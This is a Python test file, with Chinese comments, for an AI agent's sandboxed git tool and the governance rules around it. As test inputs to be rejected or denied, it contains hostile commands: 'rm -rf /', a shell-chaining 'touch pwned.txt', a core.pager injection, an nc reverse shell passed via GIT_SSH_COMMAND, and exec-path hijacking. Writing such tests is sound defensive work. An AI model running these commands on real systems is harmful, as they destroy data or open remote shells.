"""
P0-3 git 工具族（TDD 先红后绿）。

设计（docs/Neurova_Agent工具扩展计划_2026-09-12.md P0-3）：
- 单工具 `git`，command 参数为完整 git 命令行（含 git 前缀），
  shlex 拆分 + 列表式 subprocess（无 shell，注入面为零）；
- 仓库锚点由 path 参数决定（复用 _resolve_agent_path 工作区契约，09-08
  relpath 根修），--git-dir/-C 等仓库锚点逃逸选项拒绝；
- 写动词（commit/push/...）在 tool_guard 规则源标 HIGH → 生产治理
  ask_on_high=True 即 ASK；读动词（status/diff/log/...）不命中规则 →
  default ALLOW。治理是裁决的根因位置，执行体内零策略守卫。
"""

import shutil
from unittest.mock import Mock

import pytest

needs_git = pytest.mark.skipif(shutil.which("git") is None, reason="git 不在 PATH")


def _make_executor(tmp_path):
    from neurova.tool_executor import ToolExecutor

    agent = Mock()
    agent._skill_registry = Mock()
    agent.tool_router = Mock()
    agent.tool_memory = Mock()
    agent.tool_lifecycle = Mock()
    agent.skill_packer = Mock()
    agent.config = Mock()
    agent.memory_manager = Mock()
    agent.asr_manager = None
    agent.tts_manager = None
    exe = ToolExecutor(agent)
    exe._agent.workspace_path = tmp_path
    return exe


def _init_repo(tmp_path):
    """在临时工作区建一个有一次提交的真实 git 仓库。"""
    import subprocess

    def _git(*args):
        return subprocess.run(
            ["git", *args],
            cwd=str(tmp_path), capture_output=True, text=True, timeout=30,
            env={**shutil.os.environ, "GIT_CONFIG_GLOBAL": "NUL",
                 "GIT_CONFIG_SYSTEM": "NUL", "GIT_TERMINAL_PROMPT": "0"},
        )

    _git("init", "-b", "main")
    (tmp_path / "a.txt").write_text("hello", encoding="utf-8")
    _git("add", "a.txt")
    _git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-m", "init")
    return _git


# ═══════════════════════════════════════════════════════════════
# 注册不变量
# ═══════════════════════════════════════════════════════════════

class TestGitRegistration:
    def test_schema_registered(self):
        from neurova.builtin_tools import _BUILTIN_SCHEMAS

        assert "git" in _BUILTIN_SCHEMAS
        props = _BUILTIN_SCHEMAS["git"]["parameters"]["properties"]
        # command 键名 = 治理可裁决键（extract_adjudicable_params）
        assert "command" in props and "path" in props

    def test_dispatch_has_executable(self):
        from neurova.tool_executor import ToolExecutor

        assert "git" in ToolExecutor._builtin_dispatch
        method = getattr(ToolExecutor, ToolExecutor._builtin_dispatch["git"], None)
        assert method is not None and callable(method)

    def test_git_not_in_failopen_readonly(self):
        """git 可变更仓库状态，治理故障时必须 fail-closed（不入只读白名单）。"""
        from neurova.tool_executor import ToolExecutor

        assert "git" not in ToolExecutor._GOVERNANCE_FAILOPEN_READONLY_TOOLS


# ═══════════════════════════════════════════════════════════════
# 真实仓库执行（无 shell 通道）
# ═══════════════════════════════════════════════════════════════

@needs_git
class TestGitExecution:
    @pytest.mark.asyncio
    async def test_status(self, tmp_path):
        _init_repo(tmp_path)
        (tmp_path / "a.txt").write_text("modified", encoding="utf-8")
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "git status --short"}
        )
        assert result["success"] is True
        assert "a.txt" in result["stdout"]

    @pytest.mark.asyncio
    async def test_add_commit_log_flow(self, tmp_path):
        _init_repo(tmp_path)
        (tmp_path / "b.txt").write_text("new file", encoding="utf-8")
        exe = _make_executor(tmp_path)
        r1 = await exe._execute_builtin_tool("git", {"command": "git add b.txt"})
        assert r1["success"] is True, r1
        r2 = await exe._execute_builtin_tool(
            "git",
            {"command": "git -c user.email=t@t -c user.name=t commit -m 'add b'"},
        )
        # -c 是合法全局选项（允许），只要不是仓库锚点逃逸类
        assert r2["success"] is True, r2
        r3 = await exe._execute_builtin_tool("git", {"command": "git log --oneline"})
        assert "add b" in r3["stdout"]

    @pytest.mark.asyncio
    async def test_non_git_command_rejected(self, tmp_path):
        """command 必须以 git 开头（工具契约，不是治理守卫）。"""
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "rm -rf /"}
        )
        assert "error" in result and "git" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_subcommand_allowlist(self, tmp_path):
        _init_repo(tmp_path)
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "git fsck"}
        )
        assert "error" in result and "fsck" in result["error"]

    @pytest.mark.asyncio
    async def test_repo_anchor_escape_options_rejected(self, tmp_path):
        """--git-dir/-C/--work-tree 把仓库锚点移出 path——拒绝，path 契约唯一入口。"""
        for cmd in ("git --git-dir=/etc status", "git -C /etc status", "git --work-tree=/ status"):
            result = await _make_executor(tmp_path)._execute_builtin_tool(
                "git", {"command": cmd}
            )
            assert "error" in result, cmd

    @pytest.mark.asyncio
    async def test_path_escape_guard(self, tmp_path):
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "git status", "path": "../outside"}
        )
        assert "error" in result and "路径越界" in result["error"]

    @pytest.mark.asyncio
    async def test_shell_metachar_is_literal_arg_not_execution(self, tmp_path):
        """列表式 subprocess：; && | 不是 shell 分隔符。'status;' 作为子命令
        被白名单拒绝（连 git 都不会跑），绝不可能执行 touch。"""
        _init_repo(tmp_path)
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "git status; touch pwned.txt"}
        )
        # 要么白名单拒绝（无 success 键、有 error），要么 git 以非 0 退出——
        # 关键不变量：pwned.txt 绝不产生（无 shell 执行）
        assert result.get("success") is not True and ("error" in result or result.get("returncode") != 0)
        assert not (tmp_path / "pwned.txt").exists()

    @pytest.mark.asyncio
    async def test_unbalanced_quote_honest_error(self, tmp_path):
        result = await _make_executor(tmp_path)._execute_builtin_tool(
            "git", {"command": "git commit -m 'oops"}
        )
        assert "error" in result


# ═══════════════════════════════════════════════════════════════
# 治理规则：写动词 ASK / 危险形态 DENY / 读动词放行
# （裁决根因位置 = tool_guard 规则源，非执行体）
# ═══════════════════════════════════════════════════════════════

class TestGitGovernanceRules:
    def _policy(self):
        from neurova.security.governance import GovernancePolicy
        from neurova.security.tool_guard import ToolGuardEngine, ApprovalMode

        # 生产语义：ask_on_high=True（高风险弹窗确认，与 get_governance 单例同构）
        return GovernancePolicy(
            engine=ToolGuardEngine(ApprovalMode.AUTO), ask_on_high=True
        )

    @pytest.mark.parametrize("cmd", [
        "git commit -m x", "git push", "git checkout main", "git reset HEAD~1",
        "git merge feature", "git clean -fd", "git stash", "git tag v1",
    ])
    def test_write_verbs_ask(self, cmd):
        from neurova.security.governance import GovernanceDecision

        result = self._policy().evaluate(command=cmd, tool_name="git")
        assert result is not None
        assert result.decision == GovernanceDecision.ASK, f"{cmd} → {result.decision}"

    @pytest.mark.parametrize("cmd", [
        "git status --short", "git diff HEAD", "git log --oneline",
        "git show abc123", "git blame file.txt", "git ls-files",
    ])
    def test_read_verbs_allow(self, cmd):
        from neurova.security.governance import GovernanceDecision

        result = self._policy().evaluate(command=cmd, tool_name="git")
        assert result is None or result.decision == GovernanceDecision.ALLOW, cmd

    @pytest.mark.parametrize("cmd", [
        "git -c core.pager='rm -rf /' log",      # 全局选项注入执行体
        "git config --global core.editor evil",   # 持久化配置劫持
        "GIT_SSH_COMMAND=nc host -e /bin/sh git push",  # 环境注执行
        "git --exec-path=/tmp/evil status",       # 可执行路径劫持
    ])
    def test_git_rce_vectors_deny(self, cmd):
        from neurova.security.governance import GovernanceDecision

        result = self._policy().evaluate(command=cmd, tool_name="git")
        assert result is not None
        assert result.decision == GovernanceDecision.DENY, f"{cmd} → {result.decision}"

    def test_shell_path_gets_same_git_policy(self):
        """规则按命令文本命中——computer_shell 跑 git commit 同样 ASK（一致性）。"""
        from neurova.security.governance import GovernanceDecision

        result = self._policy().evaluate(command="git commit -m x", tool_name="computer_shell")
        assert result is not None
        assert result.decision == GovernanceDecision.ASK

    def test_existing_shell_semantics_unchanged(self):
        """新规则不得误伤既有语义：ls 仍 ALLOW，rm -rf 仍 DENY。"""
        from neurova.security.governance import GovernanceDecision

        p = self._policy()
        r1 = p.evaluate(command="ls -la", tool_name="computer_shell")
        assert r1 is None or r1.decision == GovernanceDecision.ALLOW
        r2 = p.evaluate(command="rm -rf /", tool_name="computer_shell")
        assert r2 is not None and r2.decision == GovernanceDecision.DENY


# ═══════════════════════════════════════════════════════════════
# 端到端闭环：经真实治理入口 _execute_single_tool（非直调 _execute_builtin_tool）
# 验证写→ASK / 读→放行，且审批重放 skip_governance 不再二次 ASK（无审批死循环）
# ═══════════════════════════════════════════════════════════════

@needs_git
class TestGitGovernanceEndToEnd:
    def _exe(self, tmp_path):
        return _make_executor(tmp_path)

    @pytest.mark.asyncio
    async def test_git_write_end_to_end_triggers_approval(self, tmp_path):
        _init_repo(tmp_path)
        (tmp_path / "n.txt").write_text("x", encoding="utf-8")
        out = await self._exe(tmp_path)._execute_single_tool(
            "git", {"command": "git commit -m 'auto'"}
        )
        # 写动词经治理 → 待审批（不是直接执行）
        assert out.get("pending_approval") is True or "确认" in str(out)

    @pytest.mark.asyncio
    async def test_git_read_end_to_end_executes(self, tmp_path):
        _init_repo(tmp_path)
        out = await self._exe(tmp_path)._execute_single_tool(
            "git", {"command": "git status --short"}
        )
        assert out.get("success") is True
        assert "pending_approval" not in out
